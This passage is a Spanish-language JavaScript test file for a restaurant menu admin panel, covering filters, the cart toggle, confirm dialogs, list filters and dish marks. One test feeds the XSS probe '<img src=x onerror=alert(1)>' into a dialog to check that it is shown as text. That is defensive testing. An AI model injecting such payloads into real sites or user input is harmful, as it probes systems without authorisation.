	test('encendido sin ninguno elegido, la nota lo avisa', () => {
		const { ctx, $ } = montarFiltros({ filtros: [] });
		ctx.pintarFiltros();
		assert.equal($('ajFiltrosCuerpo').style.display, '');
		assert.match($('ajFiltrosNota').textContent, /Todavía no has elegido ninguno/);
		assert.equal($('ajFiltrosNota').style.color, 'var(--warn)');
	});

	test('elegidos pero sin ningún plato marcado: eso es lo que parece un fallo', () => {
		// Es exactamente el caso que llevó a esto: filtros configurados, ningún
		// plato marcado, y la carta sin chips.
		const { ctx, $ } = montarFiltros({ filtros: [PICANTE, SIN_LACTEOS], productos: [plato()] });
		ctx.pintarFiltros();
		assert.match($('ajFiltrosNota').textContent, /Elegiste 2 filtros/);
		assert.match($('ajFiltrosNota').textContent, /no aparece ninguno/);
		assert.match($('ajFiltrosNota').textContent, /ficha de cada plato/, 'y dice dónde se arregla');
		assert.equal($('ajFiltrosNota').style.color, 'var(--warn)');
	});

	test('con uno solo la frase va en singular', () => {
		const { ctx, $ } = montarFiltros({ filtros: [PICANTE], productos: [plato()] });
		ctx.pintarFiltros();
		assert.match($('ajFiltrosNota').textContent, /Elegiste un filtro/);
	});

	test('si unos se usan y otros no, dice cuántos se ven', () => {
		const { ctx, $ } = montarFiltros({ filtros: [PICANTE, SIN_LACTEOS], productos: [plato('picante')] });
		ctx.pintarFiltros();
		assert.match($('ajFiltrosNota').textContent, /se ven 1 de 2/);
		assert.equal($('ajFiltrosNota').style.color, 'var(--warn)');
	});

	test('todos con plato: la nota confirma en verde', () => {
		const { ctx, $ } = montarFiltros({ filtros: [PICANTE, SIN_LACTEOS], productos: [plato('picante'), plato('sin_lacteos')] });
		ctx.pintarFiltros();
		assert.match($('ajFiltrosNota').textContent, /Tus 2 filtros se ven en la carta/);
		assert.equal($('ajFiltrosNota').style.color, 'var(--success)');
	});

	test('un plato marcado con un filtro que ya no está elegido no cuenta', () => {
		// La carta hace lo mismo: sin catálogo, ese id no resucita.
		const { ctx } = montarFiltros({ filtros: [PICANTE], productos: [plato('sin_lacteos')] });
		assert.equal(ctx.filtrosConPlato(), 0);
	});

	function montarPintado(atributos) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		const ctx = cargar('ajustes.js', '// ── PINTAR, RECOGER Y GUARDAR', '// ── FILTROS Y ETIQUETAS', {
			document: { getElementById: $ },
			renderFiltrosCatalogo: () => {}, pintarNotaCarrito: () => {}, puedeElegirCarrito: () => false,
			renderPedidos: () => {}, renderMetodosPago: () => {}, cartaTieneCarrito: () => false,
			renderToppings: () => {}, hayQueEnsenarToppings: () => false,
			// Marcar los campos que faltan vive en index.html; aquí no hay pantalla.
			pintarErroresEnCampos() {}, CAMPOS_METODOS_PAGO: [], erroresDeMetodosPago: () => [],
			carritoEnPantalla: () => false, planActual: () => ({}),
			state: { restaurante: { id: 'r1', atributos } },
			Object,
		});
		return { ctx, $ };
	}

	test('sin el dato guardado, encendido si ya había filtros elegidos', () => {
		// Bonzas tiene su filtro desde antes del interruptor y nadie escribió
		// nunca esta clave. Encontrarlo apagado sería decirle que no los tiene.
		const { ctx, $ } = montarPintado({ filtros_disponibles: [PICANTE] });
		ctx.renderAjustes();
		assert.equal($('ajFiltros').checked, true);
	});

	test('sin el dato y sin filtros, apagado', () => {
		const { ctx, $ } = montarPintado({});
		ctx.renderAjustes();
		assert.equal($('ajFiltros').checked, false);
	});

	test('guardado en false manda, aunque haya filtros elegidos', () => {
		const { ctx, $ } = montarPintado({ filtros_disponibles: [PICANTE], filtros_activos: false });
		ctx.renderAjustes();
		assert.equal($('ajFiltros').checked, false);
	});

	test('apagarlo guarda el interruptor y conserva la lista', () => {
		const { ctx, $ } = montarPintado({ filtros_disponibles: [PICANTE] });
		ctx.renderAjustes();
		$('ajFiltros').checked = false;
		const r = ctx.recolectarAjustes();
		assert.equal(r.filtros_activos, false);
		// JSON.stringify y no deepEqual: el array viene de otro realm de vm.
		assert.equal(JSON.stringify(r.filtros_disponibles.map(f => f.id)), '["picante"]',
			'apagar esconde, no borra: encenderlo otra vez tiene que dejarlo todo igual');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el carrito lo enciende el restaurante, en Ajustes', () => {
	// 15/09/2026, con vmenus-app#28: topnav y sidebar ya pintan carrito, y el
	// interruptor pasa de Apariencia (solo video y vertical) a Ajustes.
	const src = codigoDelPanel();

	test('Apariencia ya no tiene el interruptor ni lo guarda', () => {
		assert.doesNotMatch(src, /apCarrito/);
		const recolectar = src.match(/function recolectarApariencia\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(recolectar, /carrito:/);
	});

	function montar(atributos, { plan = { carrito: true }, recibe = false } = {}) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		const ctx = cargar('index.html', [
			['const MODELO_POR_DEFECTO', 'function esModeloDeVideo'],
			// Hasta pasado cartaTieneCarrito: carritoEnPantalla() la usa.
			['const MODELOS_CARRITO_OPCIONAL', '// Mismo criterio que la carta'],
			['ajustes.js', '// ── PEDIDOS DESDE LA CARTA', null],
		], {
			document: { getElementById: $ },
			state: { restaurante: { id: 'r1', atributos } },
			planActual: () => plan, recibePedidos: () => recibe,
			actualizarAvisoPedidos() {},
		});
		return { ctx, $ };
	}

	test('en topnav y sidebar con plan, se ofrece el interruptor', () => {
		for (const nav of ['topnav', 'sidebar', 'video', 'vertical', undefined]) {
			const { ctx, $ } = montar({ nav });
			assert.equal(ctx.puedeElegirCarrito(), true, nav ?? 'sin modelo');
			ctx.pintarNotaCarrito();
			assert.equal($('ajCarritoInterruptor').style.display, '', `${nav} esconde el interruptor`);
			assert.match($('ajCarritoNota').textContent, /Enciéndelo/);
		}
	});

	test('donde no se puede, se esconde el interruptor y se dice por qué', () => {
		const casos = [
			// Explorar tuvo este motivo hasta el 17/09/2026; queda para un modelo nuevo.
			[{ nav: 'modelo-futuro' }, {}, /no tiene carrito/],
			[{ nav: 'topnav' }, { plan: { carrito: false } }, /plan no incluye/],
		];
		for (const [at, opciones, motivo] of casos) {
			const { ctx, $ } = montar(at, opciones);
			assert.equal(ctx.puedeElegirCarrito(), false, JSON.stringify(at));
			ctx.pintarNotaCarrito();
			assert.equal($('ajCarritoInterruptor').style.display, 'none');
			assert.match($('ajCarritoNota').textContent, motivo);
		}
	});

	test('encendido sin número avisa de que falta, y con número no', () => {
		let { ctx, $ } = montar({ nav: 'topnav' });
		$('ajCarrito').checked = true;
		ctx.pintarNotaCarrito();
		assert.match($('ajCarritoNota').textContent, /aquí debajo el número de WhatsApp/);
		assert.equal($('ajCarritoNota').style.color, 'var(--warn)');

		({ ctx, $ } = montar({ nav: 'topnav' }, { recibe: true }));
		$('ajCarrito').checked = true;
		ctx.pintarNotaCarrito();
		assert.notEqual($('ajCarritoNota').style.color, 'var(--warn)');
	});

	test('recoger manda el carrito solo si el interruptor se podía usar', () => {
		const recoger = (atributos, marcado) => {
			const campos = {};
			const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
			const ctx = cargar('index.html', [
				['const MODELO_POR_DEFECTO', 'function esModeloDeVideo'],
				// Hasta pasado cartaTieneCarrito: carritoEnPantalla() la usa.
				['const MODELOS_CARRITO_OPCIONAL', '// Mismo criterio que la carta'],
				['ajustes.js', 'function recolectarAjustes', 'async function saveAjustes'],
				['ajustes.js', 'function puedeElegirCarrito', 'function pintarNotaCarrito'],
			], {
				document: { getElementById: $ }, state: { restaurante: { atributos }, filtrosDisponibles: [] },
				planActual: () => ({ carrito: true }),
				// Esta prueba mira el carrito, no los pagos ni los toppings.
				recolectarMetodosPago: () => ({}), hayQueEnsenarToppings: () => false,
				toppingState: { platino: [], premium: [], salsas: [] },
			});
			$('ajCarrito').checked = marcado;
			return ctx.recolectarAjustes();
		};
		assert.equal(recoger({ nav: 'sidebar' }, true).carrito, true);
		assert.equal(recoger({ nav: 'sidebar' }, false).carrito, false);
		// En el modelo carrito el interruptor está escondido y marcado a false:
		// mandarlo apagaría nada, pero dejaría un 'false' que no decidió nadie.
		assert.equal('carrito' in recoger({ nav: 'carrito' }, false), false);
		assert.equal(recoger({ nav: 'explorar' }, true).carrito, true, 'Explorar ya se puede encender');
		assert.equal('carrito' in recoger({ nav: 'modelo-futuro' }, false), false);
	});

	test('al guardar se repintan las pestañas, para que aparezca Pedidos', () => {
		const guardar = src.match(/async function saveAjustes\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /ajustarPestanasAlModelo\(\);/);
		assert.match(guardar, /falta el número de WhatsApp/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cambiar de pestaña con cambios sin guardar pregunta antes', () => {
	// Pendiente del 17/09/2026: encender un topping en Ajustes y pasar a otra
	// pestaña sin guardar dejaba irse, y el cambio se perdía sin aviso.
	function montar() {
		const campos = {}, abiertos = [], pintadas = [];
		const nodo = () => ({ classList: { add() {}, remove() {}, toggle() {} }, style: {}, textContent: '' });
		const form = { valor: 'guardado' };
		const ctx = cargar('index.html', '// ── TABS', '// ── ¿HAY MÁS PESTAÑAS FUERA?', {
			state: { rol: 'cliente' },
			document: {
				getElementById: id => (campos[id] ||= nodo()),
				querySelectorAll: () => [],
				querySelector: () => ({ textContent: 'Ajustes' }),
			},
			openModal: id => abiertos.push(id), closeModal: () => {},
			renderAjustes: () => { form.valor = 'guardado'; pintadas.push('ajustes'); },
			recolectarAjustes: () => ({ valor: form.valor }),
			renderInicio: () => pintadas.push('inicio'),
			renderToppings() {}, renderTV() {}, renderImportar() {},
			renderQR: async () => {}, seleccionarRango() {},
			hayCambiosApariencia: () => false, hayCambiosDatosResto: () => false,
			JSON,
		});
		const boton = () => ({ classList: { add() {}, remove() {} } });
		return { ctx, form, abiertos, pintadas, boton };
	}

	test('sin cambios, cambia directo', () => {
		const { ctx, abiertos, pintadas, boton } = montar();
		ctx.switchTab('ajustes', boton());
		ctx.switchTab('inicio', boton());
		assert.deepEqual(abiertos, []);
		assert.deepEqual(pintadas, ['ajustes', 'inicio']);
	});

	test('con cambios, no se va y pregunta', () => {
		const { ctx, form, abiertos, pintadas, boton } = montar();
		ctx.switchTab('ajustes', boton());
		form.valor = 'topping encendido';
		ctx.switchTab('inicio', boton());
		assert.deepEqual(abiertos, ['pestanaCambiosModal']);
		assert.deepEqual(pintadas, ['ajustes'], 'Inicio no se llegó a abrir');
	});

	test('volver a pulsar la misma pestaña no tira lo escrito', () => {
		const { ctx, form, pintadas, boton } = montar();
		ctx.switchTab('ajustes', boton());
		form.valor = 'topping encendido';
		ctx.switchTab('ajustes', boton());
		assert.equal(form.valor, 'topping encendido');
		assert.deepEqual(pintadas, ['ajustes']);
	});

	test('«Salir sin guardar» lleva a la pestaña pedida', () => {
		const { ctx, form, pintadas, boton } = montar();
		ctx.switchTab('ajustes', boton());
		form.valor = 'topping encendido';
		ctx.switchTab('inicio', boton());
		ctx.salirDePestanaSinGuardar();
		assert.deepEqual(pintadas, ['ajustes', 'inicio']);
	});

	test('después de guardar ya no pregunta', () => {
		const { ctx, form, abiertos, boton } = montar();
		ctx.switchTab('ajustes', boton());
		form.valor = 'topping encendido';
		ctx.fijarFotoDePestana('ajustes');   // lo que hace saveAjustes al terminar
		ctx.switchTab('inicio', boton());
		assert.deepEqual(abiertos, []);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los filtros de la lista de restaurantes', () => {
	// Pedido el 17/09/2026: filtrar por tipo de página, por modelo y por lo que
	// cada carta tiene encendido.
	const reglas = () => cargar('restaurantes-filtros.js', [
		// PLANES, los modelos y cartaTieneCarrito viven en index.html: las
		// funcionalidades se miden con la misma regla que la carta, no con una copia.
		['index.html', 'const TODO_INCLUIDO', '// ── AYUDA QUE DEPENDE DE QUIÉN MIRA'],
		// Y el mínimo de platos del buscador vive en ajustes.js, que es donde está
		// su interruptor: el panel lo declara una sola vez.
		['ajustes.js', '// ── BUSCADOR DE PLATOS', '// ── FILTROS Y ETIQUETAS'],
		['restaurantes-filtros.js', '// ── QUÉ SE PUEDE FILTRAR', '// ── PINTAR'],
	], { Object, Array, Boolean });
	// Un `const` de nivel superior no aparece como propiedad del contexto —solo
	// las funciones—, así que el filtro vacío se escribe aquí.
	const VACIO = { tipo: 'todos', modelo: 'todos', funciones: [], entorno: 'todos' };

	const resto = (atributos, plan) => ({ atributos: { ...atributos, plan } });

	test('el tipo sale del plan, y sin plan lo dice el modelo', () => {
		const ctx = reglas();
		assert.equal(ctx.rasgosDeResto(resto({ nav: 'sidebar' }, 'fotos')).tipo, 'fotos');
		assert.equal(ctx.rasgosDeResto(resto({ nav: 'vertical' })).tipo, 'video');
		assert.equal(ctx.rasgosDeResto(resto({})).tipo, 'fotos');
	});

	test('sin modelo guardado cuenta como Topnav, igual que la carta', () => {
		assert.equal(reglas().rasgosDeResto(resto({}, 'fotos')).modelo, 'topnav');
	});

	test('«con pedidos» es lo que la carta pinta, no el interruptor a secas', () => {
		const ctx = reglas();
		const tiene = at => ctx.rasgosDeResto(resto(at, 'fotos')).funciones.includes('pedidos');
		assert.equal(tiene({ nav: 'sidebar', carrito: true }), true);
		assert.equal(tiene({ nav: 'sidebar', carrito: false }), false);
	});

	test('los toppings solo cuentan con el carrito encendido', () => {
		const ctx = reglas();
		const con = { nav: 'sidebar', toppings_platino: [{ id: 't1', nombre: 'Queso' }] };
		assert.equal(ctx.rasgosDeResto(resto({ ...con, carrito: true }, 'fotos')).funciones.includes('toppings'), true);
		// Apagado no los borra, pero el comensal no los ve: buscarlos aquí sería
		// encontrar cartas que no los ofrecen.
		assert.equal(ctx.rasgosDeResto(resto({ ...con, carrito: false }, 'fotos')).funciones.includes('toppings'), false);
	});

	test('los filtros sin el dato cuentan como encendidos si hay alguno elegido', () => {
		const ctx = reglas();
		const tiene = at => ctx.rasgosDeResto(resto(at, 'fotos')).funciones.includes('filtros');
		assert.equal(tiene({ filtros_disponibles: [{ id: 'picante' }] }), true, 'como lo lee la carta');
		assert.equal(tiene({ filtros_disponibles: [{ id: 'picante' }], filtros_activos: false }), false);
		assert.equal(tiene({ filtros_activos: true }), false, 'encendido y sin ninguno no enseña nada');
	});

	test('la IA solo cuenta donde hay video, y se apaga desde el resumen', () => {
		const ctx = reglas();
		const tiene = (plan, resumen) => ctx.rasgosDeResto(resto({}, plan), null, resumen).funciones.includes('ia');
		assert.equal(tiene('video'), true);
		assert.equal(tiene('video', { ia_activa: false }), false);
		assert.equal(tiene('fotos'), false);
	});

	test('las funcionalidades se suman: marcar dos pide las dos', () => {
		const ctx = reglas();
		const rasgos = { tipo: 'fotos', modelo: 'sidebar', funciones: ['pedidos'], prueba: false };
		const f = { ...VACIO };
		assert.equal(ctx.pasaFiltroRestos(rasgos, { ...f, funciones: ['pedidos'] }), true);
		assert.equal(ctx.pasaFiltroRestos(rasgos, { ...f, funciones: ['pedidos', 'tv'] }), false);
	});

	test('el entorno separa los clientes de verdad de las demos', () => {
		const ctx = reglas();
		const f = { ...VACIO };
		const real = { tipo: 'fotos', modelo: 'topnav', funciones: [], prueba: false };
		assert.equal(ctx.pasaFiltroRestos(real, { ...f, entorno: 'reales' }), true);
		assert.equal(ctx.pasaFiltroRestos(real, { ...f, entorno: 'prueba' }), false);
		assert.equal(ctx.pasaFiltroRestos({ ...real, prueba: true }, { ...f, entorno: 'reales' }), false);
	});

	test('el buscador cuenta cuando el comensal lo ve, no cuando está encendido', () => {
		// La carta no lo enseña por debajo de 8 platos, así que una carta corta
		// con el interruptor encendido no lo tiene para quien la mira.
		const ctx = reglas();
		const tiene = (at, platos) => ctx.rasgosDeResto(resto(at, 'fotos'), null, null, platos)
			.funciones.includes('buscador');
		assert.equal(tiene({}, 40), true, 'ausente es encendido, como en la carta');
		assert.equal(tiene({ buscador: false }, 40), false);
		assert.equal(tiene({}, 5), false, 'encendido pero la carta es demasiado corta');
	});

	test('sin el recuento de platos se responde por el interruptor', () => {
		// Si /api/resumen-cartas falló, dejar fuera a todos sería peor: el filtro
		// diría que nadie lo tiene.
		const ctx = reglas();
		const tiene = at => ctx.rasgosDeResto(resto(at, 'fotos'), null, null, undefined)
			.funciones.includes('buscador');
		assert.equal(tiene({}), true);
		assert.equal(tiene({ buscador: false }), false);
	});

	test('solo se ofrecen los modelos del tipo elegido', () => {
		const ctx = reglas();
		// Con el spread: el array nace en el contexto del panel y deepEqual compara
		// también el prototipo, que es de otro realm.
		assert.deepEqual([...ctx.modelosDelFiltro('video')], ['video', 'vertical']);
		assert.equal(ctx.modelosDelFiltro('todos').length, 5);
	});

	test('cambiar de tipo suelta un modelo que ya no es de ese tipo', () => {
		// Si no, la lista se queda vacía y el botón que la vació ni se ve.
		const ctx = reglas();
		const f = { ...VACIO, tipo: 'video', modelo: 'vertical' };
		assert.equal(ctx.filtroTrasCambio(f, { tipo: 'fotos' }).modelo, 'todos');
		assert.equal(ctx.filtroTrasCambio(f, { tipo: 'video' }).modelo, 'vertical');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el interruptor del buscador de platos', () => {
	// La carta lo lleva desde vmenus-app#36; aquí se enciende y se apaga.
	const src = codigoDelPanel();
	const reglas = () => cargar('ajustes.js', '// ── BUSCADOR DE PLATOS', '// ── FILTROS Y ETIQUETAS', {});

	test('el mínimo de platos es el mismo que en la carta', () => {
		// Son dos aplicaciones desplegadas por separado y no pueden compartir el
		// módulo. Desincronizarlo hace que el panel prometa un buscador que la
		// carta no enseña.
		const nuestro = src.match(/MINIMO_PLATOS_BUSCADOR = (\d+)/)?.[1];
		assert.ok(nuestro, 'el panel tiene que declarar el mínimo');

		// El otro repositorio SOLO está cuando se trabaja con los dos clones al
		// lado. En CI se clona este y nada más, así que aquí se comprueba que
		// existe ANTES de leerlo: leerlo y confiar en que el archivo está es lo
		// que tumbó el pull request #174 el 17/09/2026, con esta misma prueba
		// diciendo en su comentario que era opcional.
		const otroRepo = path.join(__dirname, '..', '..', 'vmenus-app', 'core', 'buscador.js');
		if (!fs.existsSync(otroRepo)) return;

		const suyo = fs.readFileSync(otroRepo, 'utf8').match(/MINIMO_PLATOS_BUSCADOR = (\d+)/)?.[1];
		assert.ok(suyo, 'la carta tiene que declarar el mínimo');
		assert.equal(nuestro, suyo, 'el mínimo del panel y el de la carta discrepan');
	});

	test('apagado se dice, sin prometer nada', () => {
		const [texto] = reglas().notaBuscador(false, 40);
		assert.match(texto, /no enseña el buscador/);
	});

	test('encendido con pocos platos avisa de que todavía no aparece', () => {
		// Es el caso de «lo encendí y no lo veo», que si no acaba en una llamada.
		const ctx = reglas();
		const [texto, color] = ctx.notaBuscador(true, 5);
		assert.match(texto, /5 platos/);
		assert.match(texto, /a partir de 8/);
		assert.equal(color, 'var(--warn)');
	});

	test('un solo plato se dice en singular', () => {
		assert.match(reglas().notaBuscador(true, 1)[0], /1 plato:/);
	});

	test('encendido y con carta suficiente, se dice dónde sale', () => {
		const [texto, color] = reglas().notaBuscador(true, 40);
		assert.match(texto, /ven el buscador/);
		assert.equal(color, 'var(--success)');
	});

	test('el servidor lo acepta del restaurante y como booleano', () => {
		// Enseñar el interruptor no cambia lo que acepta la API: si no está en la
		// lista, el restaurante lo guarda y el servidor lo tira sin decir nada.
		const servidor = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
		const lista = servidor.match(/const ATRIBUTOS_CLIENTE_PERMITIDOS = \[[\s\S]*?\];/)[0];
		assert.match(lista, /'buscador'/);
		// Un "false" de texto es verdadero para cualquier if, y dejaría la caja
		// de búsqueda puesta después de apagarla.
		assert.match(servidor, /for \(const k of \['carrito', 'filtros_activos', 'buscador'\]\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la pestaña Superadmin: qué se lee primero', () => {
	// 17/09/2026, decidido con el usuario. Lo que identifica al restaurante y
	// decide la forma de su carta va arriba —es lo que se toca al darlo de alta
	// y lo que más se consulta—; el aspecto, después; lo avanzado, al final.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const tab = src.slice(src.indexOf('<div id="tabApariencia"'), src.indexOf('<div id="tabPromo"'));
	const orden = [...tab.matchAll(/<div class="section-title"[^>]*>([^<]+)/g)].map(m => m[1].trim());

	test('primero los datos, el plan y el modelo, en ese orden', () => {
		assert.deepEqual(orden.slice(0, 3), ['Datos del restaurante', 'Plan', 'Modelo de página']);
	});

	test('el color de fondo va pegado a la imagen de fondo', () => {
		// Solo se usa si no hay imagen, así que lejos de ella no se entiende.
		assert.equal(orden[orden.indexOf('Imagen de fondo') + 1], 'Color de fondo');
	});

	test('el CSS personalizado se queda el último', () => {
		assert.equal(orden.at(-1), 'CSS personalizado');
	});

	test('no se perdió ninguna tarjeta por el camino', () => {
		assert.equal(orden.length, 14);
		assert.equal(new Set(orden).size, 14, 'ninguna repetida');
	});

	test('el botón de guardar ya no se llama «apariencia»', () => {
		// Guarda el plan, el modelo, el dominio y la zona horaria; llamarlo
		// apariencia hacía pensar que solo guardaba los colores.
		assert.match(tab, /onclick="saveApariencia\(\)">Guardar configuración</);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('preguntar() en vez del confirm() del navegador', () => {
	// 18/09/2026, decidido con el equipo: quedaban ocho confirm() en el panel.
	// Rompen su aspecto, en el móvil peor, y algunos navegadores ofrecen «no
	// volver a preguntar», tras lo cual confirm() devuelve false sin enseñar
	// nada y el botón parece roto.
	function montar() {
		const els = {};
		const clases = () => { const s = new Set(); return { add: c => s.add(c), remove: c => s.delete(c), toggle: (c, on) => (on ? s.add(c) : s.delete(c)), contains: c => s.has(c) }; };
		const $ = id => (els[id] ||= { id, textContent: '', style: {}, classList: clases(), hijos: [],
			appendChild(h) { this.hijos.push(h); }, focus() { enfocado = id; } });
		let enfocado = null;
		const body = { style: {} };
		const ctx = cargar('preguntar.js', [['preguntar.js', 'let respuestaPendiente', null]], {
			document: {
				getElementById: $, body,
				createElement: () => ({ textContent: '' }),
				querySelector: () => (Object.values(els).some(e => e.id.endsWith('Modal') && e.id !== 'preguntaModal' && e.classList.contains('open')) ? {} : null),
			},
			Promise,
		});
		return { ctx, $, body, enfocado: () => enfocado };
	}

	test('abre la ventana del panel y responde lo que se pulsa', async () => {
		const { ctx, $ } = montar();
		const p = ctx.preguntar({ titulo: 'Eliminar el restaurante', texto: 'Vas a eliminar «Bonzas».', si: 'Eliminar', peligro: true });
		assert.equal($('preguntaModal').classList.contains('open'), true);
		assert.equal($('preguntaTitulo').textContent, 'Eliminar el restaurante');
		assert.equal($('preguntaSi').textContent, 'Eliminar');
		assert.equal($('preguntaSi').classList.contains('peligro'), true);
		ctx.responderPregunta(true);
		assert.equal(await p, true);
		assert.equal($('preguntaModal').classList.contains('open'), false);
	});

	test('el foco empieza en «no»: un Enter de más no borra nada', () => {
		const m = montar();
		m.ctx.preguntar({ texto: 'x' });
		assert.equal(m.enfocado(), 'preguntaNo');
	});

	test('lo que se pinta va como texto, no como HTML', () => {
		// Se pintan nombres de restaurantes y platos escritos por otras personas.
		const { ctx, $ } = montar();
		ctx.preguntar({ texto: '<img src=x onerror=alert(1)>', lista: ['<b>Papas</b>'] });
		assert.equal($('preguntaTexto').textContent, '<img src=x onerror=alert(1)>');
		assert.equal($('preguntaLista').hijos[0].textContent, '<b>Papas</b>');
	});

	test('una segunda pregunta da la primera por contestada que no', async () => {
		const { ctx } = montar();
		const primera = ctx.preguntar({ texto: 'a' });
		const segunda = ctx.preguntar({ texto: 'b' });
		assert.equal(await primera, false);
		ctx.responderPregunta(true);
		assert.equal(await segunda, true);
	});

	test('al cerrarse encima de la ficha del plato, la página sigue sin desplazarse', () => {
		// closeModal() lo devolvería con la ficha todavía abierta.
		const { ctx, $, body } = montar();
		$('productModal').classList.add('open');
		ctx.preguntar({ texto: 'x' });
		ctx.responderPregunta(false);
		assert.equal(body.style.overflow, 'hidden');
		$('productModal').classList.remove('open');
		ctx.preguntar({ texto: 'x' });
		ctx.responderPregunta(false);
		assert.equal(body.style.overflow, '');
	});

	test('no queda ningún confirm(), alert() ni prompt() en el panel', () => {
		for (const f of fs.readdirSync(PUBLIC).filter(n => /\.(js|html)$/.test(n))) {
			const codigo = fs.readFileSync(path.join(PUBLIC, f), 'utf8')
				.split('\n').filter(l => !/^\s*(\/\/|\*|<!--)/.test(l)).join('\n');
			// «confirm()» con los paréntesis vacíos es que un comentario lo nombra.
			assert.doesNotMatch(codigo, /(^|[^.\w])(confirm|alert|prompt)\((?!\))/, f);
		}
	});

	test('Escape y el clic fuera son «no»', () => {
		const src = codigoDelPanel();
		assert.match(src, /if\(hayPreguntaAbierta\(\)\) return responderPregunta\(false\);/);
		assert.match(src, /id="preguntaModal" onclick="if\(event\.target===this\)responderPregunta\(false\)"/);
	});
});

describe('lo que cada plato tiene marcado, visto desde la lista', () => {
	// Pedido el 17/09/2026: saber si un plato ofrece toppings o cumple un filtro
	// obligaba a abrir su ficha, y en una carta de 97 platos eso son 97 ventanas.
	const CATALOGO_FILTROS = [
		{ id: 'picante', label: 'Picante', emoji: '🌶' },
		{ id: 'veg', label: 'Vegetariano', emoji: '🌱' },
		{ id: 'gluten', label: 'Sin gluten', emoji: '🌾' },
		{ id: 'nuevo', label: 'Novedad', emoji: '✨' },
	];
	const TOPPINGS = {
		toppings_platino: [{ id: 't1', nombre: 'Queso' }, { id: 't2', nombre: 'Cebolla' }],
		toppings_premium: [{ id: 't3', nombre: 'Tocineta', precio: 4000 }],
		salsas: [{ id: 's1', nombre: 'Ajo' }],
	};

	// catalogoDe, personalizacionDe y cartaTieneCarrito viven en index.html: las
	// marcas se leen con lo mismo que la ficha, no contando claves a mano.
	const reglas = (atributos, plan = { carrito: true }) => cargar('productos-marcas.js', [
		['index.html', '// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
		['index.html', 'function catalogoDe', 'function renderPersonalizacion'],
		['productos-marcas.js', '// Cuántas marcas de cada clase', null],
	], {
		state: { restaurante: { id: 'r1', atributos } },
		planActual: () => plan,
		MODELO_POR_DEFECTO: 'topnav',
		MODELOS_CARRITO_OPCIONAL: ['topnav', 'sidebar', 'explorar', 'video', 'vertical'],
		Array, Object, String, Number, Set, document: { createElement: () => ({ appendChild() {}, style: {} }) },
	});

	const plato = (filtros, pers) => ({
		id: 'p1', nombre: 'Arepa',
		atributos: { ...(filtros ? { filtros } : {}), ...(pers ? { personalizacion: pers } : {}) },
	});

	test('los filtros salen con su emoji y su nombre', () => {
		const ctx = reglas({ nav: 'topnav', filtros_disponibles: CATALOGO_FILTROS });
		const marcas = ctx.marcasDePlato(plato(['picante', 'veg']));
		assert.deepEqual([...marcas].map(m => m.texto), ['🌶 Picante', '🌱 Vegetariano']);
	});

	test('un filtro que el restaurante ya quitó no se pinta', () => {
		// El plato lo sigue nombrando, pero sin catálogo no tiene ni nombre ni
		// emoji: sería un chip en blanco.
		const ctx = reglas({ nav: 'topnav', filtros_disponibles: [CATALOGO_FILTROS[0]] });
		assert.deepEqual([...ctx.marcasDePlato(plato(['picante', 'veg']))].map(m => m.texto), ['🌶 Picante']);
	});

	test('con muchos filtros se resumen los que sobran', () => {
		const ctx = reglas({ nav: 'topnav', filtros_disponibles: CATALOGO_FILTROS });
		const marcas = ctx.marcasDePlato(plato(['picante', 'veg', 'gluten', 'nuevo']));
		assert.equal(marcas.length, 4);
		assert.equal(marcas.at(-1).texto, '+1');
		assert.match(marcas.at(-1).titulo, /Novedad/);
	});

	test('los adicionales se cuentan por grupo, no en un solo número', () => {
		// «🧀 23» no decía de qué hablaba sin pasar el ratón (visto con
		// perroscriollos el 17/09/2026). Los nombres siguen en el título: son
		// hasta catorce por plato y taparían el nombre del plato.
		const ctx = reglas({ nav: 'topnav', carrito: true, ...TOPPINGS });
		const marcas = [...ctx.marcasDePlato(plato(null, { platino: ['t1', 't2'], premium: ['t3'], salsas: ['s1'] }))];
		assert.deepEqual(marcas.map(m => m.texto), ['🧀 2 sin costo', '💲 1 con costo', '🥫 1 salsa']);
		assert.equal(marcas[0].titulo, 'Adicionales sin costo: Queso, Cebolla');
		assert.equal(marcas[2].titulo, 'Salsas: Ajo');
	});

	test('un grupo vacío no deja una marca en cero', () => {
		const ctx = reglas({ nav: 'topnav', carrito: true, ...TOPPINGS });
		const marcas = [...ctx.marcasDePlato(plato(null, { platino: [], premium: ['t3'], salsas: [] }))];
		assert.deepEqual(marcas.map(m => m.texto), ['💲 1 con costo']);
	});

	test('dos salsas se dicen en plural', () => {
		const ctx = reglas({ nav: 'topnav', carrito: true,
			...TOPPINGS, salsas: [{ id: 's1', nombre: 'Ajo' }, { id: 's2', nombre: 'Piña' }] });
		const marcas = [...ctx.marcasDePlato(plato(null, { platino: [], premium: [], salsas: ['s1', 's2'] }))];
		assert.deepEqual(marcas.map(m => m.texto), ['🥫 2 salsas']);
	});

	test('sin carrito no se cuentan: la carta no los enseña', () => {
		const ctx = reglas({ nav: 'topnav', carrito: false, ...TOPPINGS });
		assert.deepEqual([...ctx.marcasDePlato(plato(null, { platino: ['t1'], premium: [], salsas: [] }))], []);
	});

	test('un plato sin nada marcado no deja una fila vacía', () => {
		const ctx = reglas({ nav: 'topnav', carrito: true, filtros_disponibles: CATALOGO_FILTROS, ...TOPPINGS });
		assert.deepEqual([...ctx.marcasDePlato(plato(null, { platino: [], premium: [], salsas: [] }))], []);
		assert.equal(ctx.filaDeMarcas(plato(null, { platino: [], premium: [], salsas: [] })), null);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la sesión: se renueva usándola y pregunta si nadie la usa', () => {
	// 18/09/2026, decidido con el equipo. Antes: 8 h fijas desde el login y
	// al login sin aviso, llevándose lo que se estuviera escribiendo.
